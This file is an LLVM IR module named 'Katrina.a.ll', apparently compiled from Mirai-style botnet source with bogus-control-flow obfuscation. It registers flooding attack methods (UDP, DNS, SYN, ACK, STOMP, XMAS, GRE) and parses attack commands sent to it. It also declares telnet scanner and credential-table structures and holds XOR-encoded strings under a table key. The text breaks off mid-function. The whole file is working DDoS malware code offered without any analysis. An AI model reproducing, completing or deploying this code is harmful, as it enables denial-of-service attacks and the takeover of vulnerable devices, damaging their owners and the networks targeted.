; ModuleID = 'host/ir_bcf/Katrina.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.18 = type { [16 x i64] }
%struct.timeval.19 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [4 x i8] c"\05\0E\09\00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"\03\06\02\0A\08\09\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"\03\02\01\06\12\0B\13\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"4U\01 \16)!\14\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"(\1F\0F\0B\104 _\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"\12\14\12\06\15\0E\08\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"\15\08\08\13\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"+4\0E\12>P\17(\0A= U\14\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"\06\03\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"\06\03\0A\0E\09\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"\04\06\13VWU^\00", align 1
@.str.12 = private unnamed_addr constant [13 x i8] c"\11\14\13\06\15\04\06\0AUWVR\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"UWVRWQWU\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -554828881, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0
@x.99 = common global i32 0
@y.100 = common global i32 0
@x.101 = common global i32 0
@y.102 = common global i32 0
@x.103 = common global i32 0
@y.104 = common global i32 0
@x.105 = common global i32 0
@y.106 = common global i32 0
@x.107 = common global i32 0
@y.108 = common global i32 0
@x.109 = common global i32 0
@y.110 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = load i32, i32* @x.3
  %4 = load i32, i32* @y.4
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8, align 1
  %12 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %13 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %11, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %14 = call noalias i8* @calloc(i64 1, i64 16) #6
  %15 = bitcast i8* %14 to %struct.attack_method*
  store %struct.attack_method* %15, %struct.attack_method** %13, align 8
  %16 = load i8, i8* %11, align 1
  %17 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %18 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %17, i32 0, i32 1
  store i8 %16, i8* %18, align 8
  %19 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %20 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %21 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %20, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %19, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %21, align 8
  %22 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %23 = bitcast %struct.attack_method** %22 to i8*
  %24 = load i8, i8* @methods_len, align 1
  %25 = zext i8 %24 to i32
  %26 = add nsw i32 %25, 1
  %27 = sext i32 %26 to i64
  %28 = mul i64 %27, 8
  %29 = call i8* @realloc(i8* %23, i64 %28) #6
  %30 = bitcast i8* %29 to %struct.attack_method**
  store %struct.attack_method** %30, %struct.attack_method*** @methods, align 8
  %31 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %32 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %33 = load i8, i8* @methods_len, align 1
  %34 = add i8 %33, 1
  store i8 %34, i8* @methods_len, align 1
  %35 = zext i8 %33 to i64
  %36 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %32, i64 %35
  store %struct.attack_method* %31, %struct.attack_method** %36, align 8
  %37 = load i32, i32* @x.3
  %38 = load i32, i32* @y.4
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %45 = alloca i8, align 1
  %46 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %47 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %45, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = call noalias i8* @calloc(i64 1, i64 16) #6
  %49 = bitcast i8* %48 to %struct.attack_method*
  store %struct.attack_method* %49, %struct.attack_method** %47, align 8
  %50 = load i8, i8* %45, align 1
  %51 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %52 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %51, i32 0, i32 1
  store i8 %50, i8* %52, align 8
  %53 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %54 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %55 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %54, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %53, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %55, align 8
  %56 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %57 = bitcast %struct.attack_method** %56 to i8*
  %58 = load i8, i8* @methods_len, align 1
  %59 = zext i8 %58 to i32
  %_ = sub i32 0, %59
  %gen = add i32 %_, 1
  %_1 = sub i32 %59, 1
  %gen2 = mul i32 %_1, 1
  %_3 = sub i32 0, %59
  %gen4 = add i32 %_3, 1
  %_5 = shl i32 %59, 1
  %_6 = shl i32 %59, 1
  %_7 = sub i32 %59, 1
  %gen8 = mul i32 %_7, 1
  %60 = add nsw i32 %59, 1
  %61 = sext i32 %60 to i64
  %_9 = sub i64 %61, 8
  %gen10 = mul i64 %_9, 8
  %_11 = shl i64 %61, 8
  %_12 = shl i64 %61, 8
  %_13 = sub i64 %61, 8
  %gen14 = mul i64 %_13, 8
  %62 = mul i64 %61, 8
  %63 = call i8* @realloc(i8* %57, i64 %62) #6
  %64 = bitcast i8* %63 to %struct.attack_method**
  store %struct.attack_method** %64, %struct.attack_method*** @methods, align 8
  %65 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %66 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %67 = load i8, i8* @methods_len, align 1
  %_15 = shl i8 %67, 1
  %_16 = sub i8 %67, 1
  %gen17 = mul i8 %_16, 1
  %_18 = sub i8 %67, 1
  %gen19 = mul i8 %_18, 1
  %_20 = sub i8 %67, 1
  %gen21 = mul i8 %_20, 1
  %_22 = sub i8 %67, 1
  %gen23 = mul i8 %_22, 1
  %68 = add i8 %67, 1
  store i8 %68, i8* @methods_len, align 1
  %69 = zext i8 %67 to i64
  %70 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %66, i64 %69
  store %struct.attack_method* %65, %struct.attack_method** %70, align 8
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %85, %0
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = load i32, i32* %1, align 4
  %12 = icmp slt i32 %11, 15
  %13 = load i32, i32* @x.5
  %14 = load i32, i32* @y.6
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %12, label %21, label %88

; <label>:21:                                     ; preds = %originalBBpart2
  %22 = load i32, i32* @x.5
  %23 = load i32, i32* @y.6
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %21
  %30 = load i32, i32* %1, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = icmp ne i32 %33, 0
  %35 = load i32, i32* @x.5
  %36 = load i32, i32* @y.6
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %34, label %43, label %65

; <label>:43:                                     ; preds = %originalBBpart24
  %44 = load i32, i32* @x.5
  %45 = load i32, i32* @y.6
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %43
  %52 = load i32, i32* %1, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %53
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @kill(i32 %55, i32 9) #6
  %57 = load i32, i32* @x.5
  %58 = load i32, i32* @y.6
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %65

; <label>:65:                                     ; preds = %originalBBpart28, %originalBBpart24
  %66 = load i32, i32* @x.5
  %67 = load i32, i32* @y.6
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %65
  %74 = load i32, i32* %1, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %75
  store i32 0, i32* %76, align 4
  %77 = load i32, i32* @x.5
  %78 = load i32, i32* @y.6
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %85

; <label>:85:                                     ; preds = %originalBBpart212
  %86 = load i32, i32* %1, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %1, align 4
  br label %2

; <label>:88:                                     ; preds = %originalBBpart2
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %89 = load i32, i32* %1, align 4
  %90 = icmp slt i32 %89, 15
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %21
  %91 = load i32, i32* %1, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %92
  %94 = load i32, i32* %93, align 4
  %95 = icmp ne i32 %94, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %43
  %96 = load i32, i32* %1, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %97
  %99 = load i32, i32* %98, align 4
  %100 = call i32 @kill(i32 %99, i32 9) #6
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %65
  %101 = load i32, i32* %1, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %102
  store i32 0, i32* %103, align 4
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %299

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %17
  br label %299

; <label>:31:                                     ; preds = %17
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  %34 = load i8, i8* %32, align 1
  store i8 %34, i8* %7, align 1
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 1
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %58

; <label>:41:                                     ; preds = %31
  %42 = load i32, i32* @x.7
  %43 = load i32, i32* @y.8
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %41
  %50 = load i32, i32* @x.7
  %51 = load i32, i32* @y.8
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %299

; <label>:58:                                     ; preds = %31
  %59 = load i32, i32* @x.7
  %60 = load i32, i32* @y.8
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  %67 = load i8*, i8** %3, align 8
  %68 = getelementptr inbounds i8, i8* %67, i32 1
  store i8* %68, i8** %3, align 8
  %69 = load i8, i8* %67, align 1
  store i8 %69, i8* %8, align 1
  %70 = load i32, i32* %4, align 4
  %71 = sext i32 %70 to i64
  %72 = sub i64 %71, 1
  %73 = trunc i64 %72 to i32
  store i32 %73, i32* %4, align 4
  %74 = load i8, i8* %8, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 0
  %77 = load i32, i32* @x.7
  %78 = load i32, i32* @y.8
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart210, label %originalBB1alteredBB

originalBBpart210:                                ; preds = %originalBB1
  br i1 %76, label %85, label %86

; <label>:85:                                     ; preds = %originalBBpart210
  br label %299

; <label>:86:                                     ; preds = %originalBBpart210
  %87 = load i32, i32* %4, align 4
  %88 = sext i32 %87 to i64
  %89 = load i8, i8* %8, align 1
  %90 = zext i8 %89 to i64
  %91 = mul i64 5, %90
  %92 = icmp ult i64 %88, %91
  br i1 %92, label %93, label %94

; <label>:93:                                     ; preds = %86
  br label %299

; <label>:94:                                     ; preds = %86
  %95 = load i8, i8* %8, align 1
  %96 = zext i8 %95 to i64
  %97 = call noalias i8* @calloc(i64 %96, i64 24) #6
  %98 = bitcast i8* %97 to %struct.attack_target*
  store %struct.attack_target* %98, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %99

; <label>:99:                                     ; preds = %162, %94
  %100 = load i32, i32* %5, align 4
  %101 = load i8, i8* %8, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp slt i32 %100, %102
  br i1 %103, label %104, label %165

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* @x.7
  %106 = load i32, i32* @y.8
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %104
  %113 = load i8*, i8** %3, align 8
  %114 = bitcast i8* %113 to i32*
  %115 = load i32, i32* %114, align 4
  %116 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %117 = load i32, i32* %5, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i64 %118
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i32 0, i32 1
  store i32 %115, i32* %120, align 4
  %121 = load i8*, i8** %3, align 8
  %122 = getelementptr inbounds i8, i8* %121, i64 4
  store i8* %122, i8** %3, align 8
  %123 = load i8*, i8** %3, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %3, align 8
  %125 = load i8, i8* %123, align 1
  %126 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 2
  store i8 %125, i8* %130, align 4
  %131 = load i32, i32* %4, align 4
  %132 = sext i32 %131 to i64
  %133 = sub i64 %132, 5
  %134 = trunc i64 %133 to i32
  store i32 %134, i32* %4, align 4
  %135 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %136 = load i32, i32* %5, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 0
  %140 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %139, i32 0, i32 0
  store i16 2, i16* %140, align 4
  %141 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %142 = load i32, i32* %5, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %148 = load i32, i32* %5, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %146, i32* %153, align 4
  %154 = load i32, i32* @x.7
  %155 = load i32, i32* @y.8
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart230, label %originalBB12alteredBB

originalBBpart230:                                ; preds = %originalBB12
  br label %162

; <label>:162:                                    ; preds = %originalBBpart230
  %163 = load i32, i32* %5, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %5, align 4
  br label %99

; <label>:165:                                    ; preds = %99
  %166 = load i32, i32* %4, align 4
  %167 = sext i32 %166 to i64
  %168 = icmp ult i64 %167, 1
  br i1 %168, label %169, label %170

; <label>:169:                                    ; preds = %165
  br label %299

; <label>:170:                                    ; preds = %165
  %171 = load i8*, i8** %3, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 1
  store i8* %172, i8** %3, align 8
  %173 = load i8, i8* %171, align 1
  store i8 %173, i8* %9, align 1
  %174 = load i32, i32* %4, align 4
  %175 = sext i32 %174 to i64
  %176 = sub i64 %175, 1
  %177 = trunc i64 %176 to i32
  store i32 %177, i32* %4, align 4
  %178 = load i8, i8* %9, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp sgt i32 %179, 0
  br i1 %180, label %181, label %291

; <label>:181:                                    ; preds = %170
  %182 = load i8, i8* %9, align 1
  %183 = zext i8 %182 to i64
  %184 = call noalias i8* @calloc(i64 %183, i64 16) #6
  %185 = bitcast i8* %184 to %struct.attack_option*
  store %struct.attack_option* %185, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %186

; <label>:186:                                    ; preds = %271, %181
  %187 = load i32, i32* %5, align 4
  %188 = load i8, i8* %9, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp slt i32 %187, %189
  br i1 %190, label %191, label %274

; <label>:191:                                    ; preds = %186
  %192 = load i32, i32* %4, align 4
  %193 = sext i32 %192 to i64
